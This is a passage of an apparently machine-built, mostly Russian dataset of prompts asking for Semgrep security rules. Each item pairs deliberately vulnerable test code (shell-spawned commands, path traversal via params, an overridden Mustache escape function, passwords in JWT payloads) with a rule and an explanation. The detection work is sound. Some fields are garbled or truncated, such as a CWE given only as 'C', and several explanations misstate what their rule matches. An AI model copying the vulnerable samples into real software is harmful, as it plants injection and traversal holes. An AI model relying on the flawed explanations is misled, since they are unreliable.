focus-metavariable: $FUNC\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          require('child_process')\n          ...\n      - pattern-inside: |\n          import 'child_process'\n          ...\n    - pattern-either:\n      - pattern: spawn(...)\n      - pattern: spawnSync(...)\n      - pattern: $CP.spawn(...)\n      - pattern: $CP.spawnSync(...)\n    - pattern-either:\n      - pattern: |\n          $EXEC(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",[\"-c\", $ARG, ...],...)\n      - patterns:\n        - pattern: $EXEC($CMD,[\"-c\", $ARG, ...],...)\n        - pattern-inside: |\n            $CMD = \"=~/(sh|bash|ksh|csh|tcsh|zsh)/\"\n            ...\n      - pattern: |\n          $EXEC(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",[$ARG, ...],...)\n      - patterns:\n        - pattern: $EXEC($CMD,[$ARG, ...],...)\n        - pattern-inside: |\n            $CMD = \"=~/(sh|bash|ksh|csh|tcsh|zsh)/\"\n            ...\n    - focus-metavariable: $ARG\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных вызовов функций запуска внешних процессов ($EXEC()) в JavaScript-коде. Источниками (sources) являются функции, содержащие вызовы child_process.spawn() или child_process.spawnSync(), а также импорт модуля child_process. Синками (sinks) считаются небезопасные аргументы командной строки, переданные в эти функции через переменную $ARG, которая может быть неявно загрязнена данными пользователя. Правило использует метапеременную $FUNC для захвата имени функции и проверяет, является ли оно одним из модулей child_process, а затем применяет шаблон для проверки аргументов командной строки.\n\n# Ключевые элементы:\n- ID: dangerous-spawn-shell\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-spawn-shell",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: avoid-render-dynamic-path\nОписание уязвимости: Avoid rendering user input. It may be possible for a malicious user to input a path that lets them access a template they shouldn't. To prevent this, check dynamic template paths against a predefined allowlist to make sure it's an allowed template.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-render-dynamic-path.rb\n#ruleid: avoid-render-dynamic-path\nrender(action => params[:action], {})\n\n#ruleid: avoid-render-dynamic-path\nrender(action => cookies[:name], {})\n\n#ruleid: avoid-render-dynamic-path\nrender(action => h(request.env['HTTP_REFERRER']), {})\n\n#ruleid: avoid-render-dynamic-path\nrender(template => foo(request.env['HTTP_REFERRER']), {})\n\n#ok: avoid-render-dynamic-path\nrender(inline => params[:action], {})\n\n#ok: avoid-render-dynamic-path\nrender(action => my_action, {})\n\n#ok: avoid-render-dynamic-path\nrender(my_json)  # Ограничиваем длину\n\nОпасные паттерны:\n• render(action => params[:action], {})\n• render(action => cookies[:name], {})\n• render(action => h(request.env['HTTP_REFERRER']), {})\n\nБезопасные паттерны:  \n• render(inline => params[:action], {})\n• render(action => my_action, {})\n• render(my_json)\n\nЛегенда аннотаций:\n- // ruleid:avoid-render-dynamic-path: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-render-dynamic-path: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-render-dynamic-path\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    references:\n    - https://brakemanscanner.org/docs/warning_types/dynamic_render_paths/\n    category: security\n    technology:\n    - rails\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  message: >-\n    Avoid rendering user input. It may be possible for a malicious user to input a path that lets them\n    access a template they\n    shouldn't. To prevent this, check dynamic template paths against a predefined allowlist to make sure\n    it's an allowed template.\n  languages: [ruby]\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - pattern: params\n  - pattern: cookies\n  - pattern: request.env\n  pattern-sinks:\n  - patterns:\n    - pattern-inside: render($X => $INPUT, ...)\n    - pattern: $INPUT\n    - metavariable-pattern:\n        metavariable: $X\n        pattern-either:\n        - pattern: action\n        - pattern: template\n        - pattern: partial\n        - pattern: file\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ситуаций, когда пользовательский ввод передается напрямую в параметр 'template' функции 'render' без предварительной проверки. Источники потенциальной угрозы определяются как параметры запроса ('params'), куки ('cookies') и переменные окружения ('request.env'). Синки (места возможной опасности) обнаруживаются внутри шаблона вызова 'render', где первый аргумент является ключом, а второй аргументом является выражение, содержащее потенциально небезопасный ввод ($INPUT). Правило использует метапеременную $X для обозначения возможных параметров 'action', 'template', 'partial' или 'file'. Это позволяет охватить различные варианты использования функции 'render' в Ruby on Rails.\n\n# Ключевые элементы:\n- ID: avoid-render-dynamic-path\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-render-dynamic-path",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: gcp-bigquery-private-table-iam-member\nОписание уязвимости: Ensure that BigQuery Tables are not anonymously or publicly accessible\t\t\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-bigquery-private-table-iam-member.tf\n# ok: gcp-bigquery-private-table-iam-member\nresource \"google_bigquery_table_iam_member\" \"pass1\" {\n  cluster = \"my-private-table-member1\"\n  role    = \"roles/bigquery.connectionUser\"\n  member  = \"group:mygroup@example.com\"\n}\n\n# ok: gcp-bigquery-private-table-iam-member\nresource \"google_bigquery_table_iam_member\" \"pass2\" {\n  cluster = \"my-private-table-member2\"\n  role    = \"roles/bigquery.dataEditor\"\n  member  = \"domain:example.com\"\n}\n\n# fail\n# ruleid: gcp-bigquery-private-table-iam-member\nresource \"google_bigquery_table_iam_member\" \"fail1\" {\n  cluster = \"my-public-table-member1\"\n  role    = \"roles/bigquery.metadataViewer\"\n  member  = \"allAuthenticatedUsers\"\n}\n\n# fail\n# ruleid: gcp-bigquery-private-table-iam-member\nresource \"google_bigquery_table_iam_member\" \"fail2\" {\n  cluster = \"my-public-table-member2\"\n  role    = \"roles/bigquery.readSessionUser\"\n  member  = \"allUsers\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_bigquery_table_iam_member\" \"fail1\" { cluster = \\\"my-public-table-member1\\\" role = \\\"roles/bigquery.metadataViewer\\\" member = \\\"allAuthenticatedUsers\\\" }\n• resource \"google_bigquery_table_iam_member\" \"fail2\" { cluster = \\\"my-public-table-member2\\\" role = \\\"roles/bigquery.readSessionUser\\\" member = \\\"allUsers\\\" }\n\nБезопасные паттерны:  \n• resource \"google_bigquery_table_iam_member\" \"pass1\" { cluster = \\\"my-private-table-member1\\\" role = \\\"roles/bigquery.connectionUser\\\" member = \\\"group:mygroup@example.com\\\" }\n• resource \"google_bigquery_table_iam_member\" \"pass2\" { cluster = \\\"my-private-table-member2\\\" role = \\\"roles/bigquery.dataEditor\\\" member = \\\"domain:example.com\\\" }\n\nЛегенда аннотаций:\n- // ruleid:gcp-bigquery-private-table-iam-member: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-bigquery-private-table-iam-member: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-bigquery-private-table-iam-member\n  patterns:\n  - pattern: resource\n  - pattern-either:\n    - pattern-inside: |\n        resource \"google_bigquery_table_iam_member\" \"...\" {\n        ...\n        member = \"allAuthenticatedUsers\"\n        ...\n        }\n    - pattern-inside: |\n        resource \"google_bigquery_table_iam_member\" \"...\" {\n        ...\n        member = \"allUsers\"\n        ...\n        }\n  message: >-\n    Ensure that BigQuery Tables are not anonymously or publicly accessible\t\t\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google BigQuery Table IAM Member в конфигурациях Terraform, где членство установлено либо на \"allAuthenticatedUsers\", либо на \"allUsers\". Эти настройки предоставляют анонимный или публичный доступ к таблицам BigQuery, что нарушает контроль доступа и может привести к утечке данных. Правило использует шаблон ресурса и проверяет содержимое блока member внутри шаблона ресурса, чтобы выявить опасные конфигурации.\n\n# Ключевые элементы:\n- ID: gcp-bigquery-private-table-iam-member\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-bigquery-private-table-iam-member",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: aws-rds-backup-no-retention\nОписание уязвимости: The AWS RDS has no retention. Missing retention can cause losing important event information. To fix this, set a `backup_retention_period`.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-rds-backup-no-retention.tf\nresource \"aws_rds_cluster\" \"pass\" {\n  backup_retention_period = 35\n}\n\nresource \"aws_rds_cluster\" \"pass2\" {\n}\n# ruleid: aws-rds-backup-no-retention\nresource \"aws_rds_cluster\" \"fail2\" {\n  backup_retention_period = 0\n}\n\nresource \"aws_db_instance\" \"pass\" {\n  backup_retention_period = 35\n}\n\nresource \"aws_db_instance\" \"pass2\" {\n}\n# ruleid: aws-rds-backup-no-retention\nresource \"aws_db_instance\" \"fail\" {\n  backup_retention_period = 0\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_rds_cluster\" \"fail2\" { backup_retention_period = 0 }\n• resource \"aws_db_instance\" \"fail\" { backup_retention_period = 0 }\n\nБезопасные паттерны:  \n• resource \"aws_rds_cluster\" \"pass\" { backup_retention_period = 35 }\n• resource \"aws_db_instance\" \"pass\" { backup_retention_period = 35 }\n\nЛегенда аннотаций:\n- // ruleid:aws-rds-backup-no-retention: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-rds-backup-no-retention: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-rds-backup-no-retention\n  patterns:\n  - pattern-either:\n    - pattern: |\n        resource \"aws_rds_cluster\" $ANYTHING {\n          ...\n          backup_retention_period = 0\n          ...\n        }\n    - pattern: |\n        resource \"aws_db_instance\" $ANYTHING {\n          ...\n          backup_retention_period = 0\n          ...\n        }\n  message: The AWS RDS has no retention. Missing retention can cause losing important event information.\n    To fix this, set a `backup_retention_period`.\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    technology:\n    - aws\n    - terraform\n    category: security\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS RDS или AWS DB Instance, у которых не установлен параметр backup_retention_period. Анализ выполняется путем поиска шаблонов HCL-кода, соответствующих ресурсам с явно установленным значением backup_retention_period равным нулю. Правило использует оператор pattern-either для проверки обоих типов ресурсов AWS RDS и AWS DB Instance.\n\n# Ключевые элементы:\n- ID: aws-rds-backup-no-retention\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-rds-backup-no-retention",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: escape-function-overwrite\nОписание уязвимости: The Mustache escape function is being overwritten. This could bypass HTML escaping safety measures built into the rendering engine, exposing your application to cross-site scripting (XSS) vulnerabilities. If you need unescaped HTML, use the triple brace operator in your template: '{{{ ... }}}'.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: escape-function-overwrite.js\n// cf. https://github.com/janl/mustache.js/#include-templates\n\n// e.g., browser code:\n// ruleid: escape-function-overwrite\nMustache.escape = function(val) { return val; }\n\nfunction renderHello() {\n  var template = document.getElementById('template').innerHTML;\n  var rendered = Mustache.render(template, { name: 'Luke' });\n  document.getElementById('target').innerHTML = rendered;\n}\n\n// e.g., Node.js code:\nfunction node() {\n  const template = require(\"mustache\");\n  // ruleid: escape-function-overwrite\n  template.escape = (t) => { return t; }\n  let html = template.render(blogItem, { });\n}\n\nfunction ok() {\n  // ok: escape-function-overwrite\n  const template = require(\"mustache\");\n  let html = template.render(blogItem, { });\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Mustache.escape = function(val) { return val; }\n• const template = require(\"mustache\");\ntemplate.escape = (t) => { return t; }\n\nБезопасные паттерны:  \n• const template = require(\"mustache\");\nlet html = template.render(blogItem, { });\n• const Mustache = require(\"mustache\");\nlet html = Mustache.render(template, data)\n\nЛегенда аннотаций:\n- // ruleid:escape-function-overwrite: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:escape-function-overwrite: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: escape-function-overwrite\n  message: >-\n    The Mustache escape function is being overwritten. This could bypass\n    HTML escaping safety measures built into the rendering engine, exposing\n    your application to cross-site scripting (XSS) vulnerabilities. If you\n    need unescaped HTML, use the triple brace operator in your template:\n    '{{{ ... }}}'.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://github.com/janl/mustache.js/#variables\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  pattern-either:\n  - pattern: Mustache.escape = ...\n  - patterns:\n    - pattern-inside: |\n        $MUSTACHE = require(\"mustache\");\n        ...\n    - pattern: $MUSTACHE.escape = ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска переопределения функции escape в библиотеке Mustache, которая используется для безопасной генерации HTML. Переопределение этой функции может привести к обходу мер защиты от XSS-взломов. Правило использует комбинацию двух шаблонов: первый ищет прямое присвоение переменной Mustache.escape, второй ищет присвоение переменной escape внутри выражения require(\"mustache\").\n\n# Ключевые элементы:\n- ID: escape-function-overwrite\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "escape-function-overwrite",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения openzeppelin-ecdsa-recover-malleable\nОписание уязвимости: Potential signature malleability in $F\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: openzeppelin-ecdsa-recover-malleable.sol\ncontract Kek {\n    mapping (bytes => bool) lulz;\n    // ruleid: openzeppelin-ecdsa-recover-malleable\n    function lol(bytes digest, bytes memory signature) {\n        uint a = 1;\n        (address recoveredAddress, ECDSA.RecoverError err) = ECDSA.recover(digest, signature);\n        string b = 2;\n        lulz[signature] = true;\n        bool c = 3;\n    }\n    \n    // ruleid: openzeppelin-ecdsa-recover-malleable\n    function lol2(bytes memory signature, bytes digest) {\n        uint a = 1;\n        (address recoveredAddress, ECDSA.RecoverError err) = ECDSA.recover(digest, signature);\n        string b = 2;\n        lulz[signature] = true;\n        bool c = 3;\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: openzeppelin-ecdsa-recover-malleable.sol\ncontract Kek {\n    mapping (bytes => bool) lulz;\n    // ruleid: openzeppelin-ecdsa-recover-malleable\n    function lol(bytes digest, bytes memory signa\n• // File: openzeppelin-ecdsa-recover-malleable.sol\ncontract Kek {\n    mapping (bytes => bool) lulz;\n    // ruleid: openzeppelin-ecdsa-recover-malleable\n    function lol2(bytes memory signature, bytes d\n\nБезопасные паттерны:  \n• // File: safe-code.sol\ncontract SafeContract {\n    mapping (bytes => bool) signatures;\n    function verifySignature(bytes memory digest, bytes memory signature) public view returns(bool) {\n        add\n• // File: another-safe-code.sol\ncontract AnotherSafeContract {\n    mapping (bytes32 => bool) signatures;\n    function checkSignature(bytes memory digest, bytes memory signature) public view returns(boo\n\nЛегенда аннотаций:\n- // ruleid:openzeppelin-ecdsa-recover-malleable: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:openzeppelin-ecdsa-recover-malleable: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n -\n    id: openzeppelin-ecdsa-recover-malleable\n    message: Potential signature malleability in $F\n    metadata:\n      category: security\n      technology:\n        - solidity\n      cwe: \"CWE-347: Improper Verification of Cryptographic Signature\"\n      confidence: LOW\n      likelihood: MEDIUM\n      impact: MEDIUM\n      subcategory:\n          - vuln\n      references:\n         - https://github.com/advisories/GHSA-4h98-2769-gh6h\n    pattern-either:\n    - pattern: |\n         function $F(..., bytes $Y, ...) {\n            ...\n            $Z = ECDSA.recover(..., $Y);\n            ...\n            $A[$Y] = ...;\n            ...\n         }\n    - pattern: |\n         function $F(..., bytes $Y, ...) {\n            ...\n            $Z = ECDSA.recover(..., $Y);\n            ...\n            $A[$B][$Y] = ...;\n            ...\n         }\n    languages: \n    - solidity\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей сигнатурной податливости в функциях Solidity, использующих библиотеку OpenZeppelin ECDSA recover. Оно ищет функции, принимающие два параметра: байтовый массив (обычно сигнатура) и другой параметр, а затем вызывающие функцию ECDSA.recover(). В опасных примерах сигнатуры сохраняются в карту или массив без проверки их уникальности, что может привести к атакам типа 'подмены подписи'. Безопасный код включает проверку корректности сигнатур перед сохранением.\n\n# Ключевые элементы:\n- ID: openzeppelin-ecdsa-recover-malleable\n- Язык: solidity \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "openzeppelin-ecdsa-recover-malleable",
      "language": "solidity",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: ruby-jwt-exposed-credentials\nОписание уязвимости: Password is exposed through JWT token payload. This is not encrypted and the password could be compromised. Do not store passwords in JWT tokens.\nCWE: CWE-522: Insufficiently Protected Credentials\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-522: Insufficiently Protected Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: jwt-exposed-credentials.rb\nrequire 'jwt'\n\ndef bad1(hmac_secret)\n    # ruleid: ruby-jwt-exposed-credentials\n    payload = { data: 'data', password: 12345 }\n    token = JWT.encode payload, hmac_secret, 'HS256'\n    puts token\nend\n\ndef ok1(hmac_secret)\n    # ok: ruby-jwt-exposed-credentials\n    payload = { data: 'data', nbf: nbf }\n    token = JWT.encode payload, hmac_secret, 'HS256'\n    puts token\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• payload = { data: 'data', password: 12345 }\n• payload = { user: 'user', password: 'pass' }\n• payload = { account: { username: 'admin', password: 'secret' }}\n\nБезопасные паттерны:  \n• payload = { data: 'data', nbf: nbf }\n• payload = { session_id: 'session123', timestamp: Time.now }\n• payload = { user_info: { name: 'John Doe', email: 'john@example.com' }}\n\nЛегенда аннотаций:\n- // ruleid:ruby-jwt-exposed-credentials: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ruby-jwt-exposed-credentials: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ruby-jwt-exposed-credentials\n  languages:\n  - ruby\n  metadata:\n    cwe:\n    - 'CWE-522: Insufficiently Protected Credentials'\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A04:2021 - Insecure Design\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    references:\n    - https://cwe.mitre.org/data/definitions/522.html\n    category: security\n    technology:\n    - jwt\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  message: >-\n    Password is exposed through JWT token payload. This is not encrypted and\n    the password could be compromised. Do not store passwords in JWT tokens.\n  patterns:\n  - pattern-inside: |\n      require 'jwt'\n      ...\n  - pattern: |\n      $PAYLOAD = {...,password:...,...}\n      ...\n      JWT.encode($PAYLOAD,...)\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования Ruby библиотеки JWT, где в payload токена содержится поле 'password'. Паттерн сначала ищет требование библиотеки JWT, затем проверяет наличие поля 'password' в payload и наконец проверяет вызов функции encode для создания токена. Это позволяет обнаружить случаи, когда пароль явно передается через JWT-токен, что является небезопасным практическим подходом.\n\n# Ключевые элементы:\n- ID: ruby-jwt-exposed-credentials\n- Язык: ruby \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "ruby-jwt-exposed-credentials",
      "language": "ruby",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения avoid-tainted-file-access\nОписание уязвимости: Using user input when accessing files is potentially dangerous. A malicious actor could use this to modify or access files they have no right to.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-tainted-file-access.rb\ndef foo\n\n    #\n    # Test bad open combinations\n\n    # ruleid: avoid-tainted-file-access\n    File.open(\"/tmp/#{params[:name]}\")\n    # ruleid: avoid-tainted-file-access\n    File.open(params[:name])\n    # ok: avoid-tainted-file-access\n    File.open(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    Dir.open(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    Dir.open(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    IO.open(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    IO.open(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    Kernel.open(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    Kernel.open(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    PStore.open(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    PStore.open(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    Pathname.open(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    Pathname.open(\"/tmp/usr/bin\")\n\n    #\n    # Test bad chdir combinations\n\n    # ruleid: avoid-tainted-file-access\n    File.chdir(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    File.chdir(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    Dir.chdir(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    Dir.chdir(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    IO.chdir(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    IO.chdir(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    Kernel.chdir(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    Kernel.chdir(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    PStore.chdir(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    PStore.chdir(\"/tmp/usr/bin\")\n\n    # ruleid: avoid-tainted-file-access\n    Pathname.chdir(\"/tmp/#{params[:name]}\")\n    # ok: avoid-tainted-file-access\n    Pathname.chdir(\"/tmp/usr/bin\")\n\n    #\n    # Test ba  # Ограничиваем длину\n\nОпасные паттерны:\n• File.open(\"/tmp/#{params[:name]}\")\n• Dir.open(\"/tmp/#{params[:name]}\")\n• IO.open(\"/tmp/#{params[:name]}\")\n\nБезопасные паттерны:  \n• File.open(\"/tmp/usr/bin\")\n• Dir.open(\"/tmp/usr/bin\")\n• IO.open(\"/tmp/usr/bin\")\n\nЛегенда аннотаций:\n- // ruleid:avoid-tainted-file-access: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-tainted-file-access: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-tainted-file-access\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    references:\n    - https://github.com/presidentbeef/brakeman/blob/main/docs/warning_types/file_access/index.markdown\n    category: security\n    technology:\n    - rails\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  message: >-\n    Using user input when accessing files is potentially dangerous. A malicious actor could use this to\n    modify or access files\n    they have no right to.\n  languages: [ruby]\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - pattern: params\n  - pattern: cookies\n  - pattern: request.env\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: Dir.$X(...)\n      - pattern: File.$X(...)\n      - pattern: IO.$X(...)\n      - pattern: Kernel.$X(...)\n      - pattern: PStore.$X(...)\n      - pattern: Pathname.$X(...)\n    - metavariable-pattern:\n        metavariable: $X\n        patterns:\n        - pattern-either:\n          - pattern: chdir\n          - pattern: chroot\n          - pattern: delete\n          - pattern: entries\n          - pattern: foreach\n          - pattern: glob\n          - pattern: install\n          - pattern: lchmod\n          - pattern: lchown\n          - pattern: link\n          - pattern: load\n          - pattern: load_file\n          - pattern: makedirs\n          - pattern: move\n          - pattern: new\n          - pattern: open\n          - pattern: read\n          - pattern: readlines\n          - pattern: rename\n          - pattern: rmdir\n          - pattern: safe_unlink\n          - pattern: symlink\n          - pattern: syscopy\n          - pattern: sysopen\n          - pattern: truncate\n          - pattern: unlink\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования пользовательского ввода при доступе к файлам, что потенциально опасно. Правило применяет анализ taint и проверяет источники (sources), такие как params, cookies и request.env, а затем ищет возможные места доступа к файлам (sinks) через различные методы Ruby, включая File, Dir, IO, Kernel, PStore и Pathname. Опасным считается вызов методов, таких как chdir, chroot, delete, entries, foreach, glob, install, lchmod, lchown, link, load, load_file, makedirs, move, new, open, read, readlines, rename, rmdir, safe_unlink, symlink, syscopy, sysopen, truncate и unlink, если они принимают пользовательский ввод напрямую или через метавариабельную переменную.\n\n# Ключевые элементы:\n- ID: avoid-tainted-file-access\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-tainted-file-access",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dangerous-asyncio-create-exec\nОписание уязвимости: Detected 'create_subprocess_exec' function with argument tainted by `event` object. If this data can be controlled by a malicious actor, it may be an instance of command injection. Audit the use of this call to ensure it is not controllable by an external resource. You may consider using 'shlex.escape()'.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
